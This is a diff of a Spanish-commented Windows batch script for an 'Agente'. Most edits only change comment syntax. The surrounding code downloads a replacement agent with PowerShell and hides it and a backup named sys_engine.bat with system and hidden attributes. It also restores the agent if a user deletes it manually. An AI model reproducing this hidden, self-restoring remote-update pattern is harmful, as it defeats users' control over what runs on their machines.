@@ -46,20 +46,18 @@ if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
     copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
     del "%VLINEA%" >nul 2>&1
 
-    ::
-    ::
-    :: Si la nube tiene una versión superior, descargamos el nuevo Agente
+    rem Si la nube tiene una versión superior, descargamos el nuevo Agente
+    rem 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
 
-    :: 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
     attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
     attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
             
-    :: 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
-    :: Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
+    rem 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
+    rem Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
     powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
     copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
             
-    :: 2.3 RE-ACTIVACIÓN DE ESCUDOS
+    rem 2.3 RE-ACTIVACIÓN DE ESCUDOS
     attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
     attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
         
@@ -68,12 +66,12 @@ if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
 
 
 
-    :: --- 4. RESTAURACIÓN Y EJECUCIÓN ---
-    :: Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
+    rem --- 4. RESTAURACIÓN Y EJECUCIÓN ---
+    rem Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
     if not exist "%AGENTE_FILE%" (
         if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
         
-        :: Restauramos y blindamos inmediatamente
+        rem  Restauramos y blindamos inmediatamente
         copy /y "%BACKUP_DIR%\sys_engine.bat" "%AGENTE_FILE%" >nul 2>&1
         attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
     )
